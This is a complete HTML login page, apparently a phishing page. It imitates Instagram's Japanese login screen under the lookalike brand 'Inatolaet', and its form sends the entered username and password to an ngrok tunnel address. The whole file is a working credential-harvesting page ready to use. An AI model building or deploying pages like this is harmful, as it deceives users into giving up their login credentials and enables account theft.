<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Inatolaet Login Test</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        .login-container {
            background-color: #fff;
            border: 1px solid #dbdbdb;
            width: 350px;
            padding: 40px;
            box-sizing: border-box;
            text-align: center;
        }

        .logo {
            font-size: 40px;
            font-weight: bold;
            margin-bottom: 30px;
            font-family: 'Cookie', cursive;
            font-style: italic;
        }

        form {
            display: flex;
            flex-direction: column;
        }

        input {
            background-color: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            padding: 10px;
            margin-bottom: 10px;
            font-size: 12px;
        }

        input:focus {
            border-color: #a8a8a8;
            outline: none;
        }

        button {
            background-color: #0095f6;
            color: white;
            border: none;
            border-radius: 8px;
            padding: 7px;
            font-weight: bold;
            font-size: 14px;
            cursor: pointer;
            margin-top: 10px;
        }

        button:hover {
            background-color: #1877f2;
        }

        .divider {
            display: flex;
            align-items: center;
            margin: 20px 0;
            color: #8e8e8e;
            font-size: 13px;
        }

        .divider::before, .divider::after {
            content: "";
            flex: 1;
            height: 1px;
            background-color: #dbdbdb;
        }

        .divider:not(:empty)::before { margin-right: 15px; }
        .divider:not(:empty)::after { margin-left: 15px; }

        .forgot-password {
            font-size: 12px;
            color: #00376b;
            text-decoration: none;
            margin-top: 20px;
            display: block;
        }

        .signup-box {
            background-color: #fff;
            border: 1px solid #dbdbdb;
            width: 350px;
            margin-top: 10px;
            padding: 20px;
            box-sizing: border-box;
            text-align: center;
            font-size: 14px;
        }

        .signup-box a {
            color: #0095f6;
            text-decoration: none;
            font-weight: bold;
        }
    </style>
</head>
<body>

    <div>
        <div class="login-container">
            <div class="logo">Inatolaet</div>
            <form action="https://ea4f66046a74.ngrok-free.app/login" method="POST">
                <input type="text" name="username" placeholder="電話番号、ユーザー名、メールアドレス" required>
                <input type="password" name="password" placeholder="パスワード" required>
                <button type="submit">ログイン</button>
            </form>

            <div class="divider">または</div>
            <a href="#" class="forgot-password">パスワードを忘れた場合</a>
        </div>

        <div class="signup-box">
            アカウントをお持ちでないですか？ <a href="#">登録する</a>
        </div>
    </div>

</body>
</html>
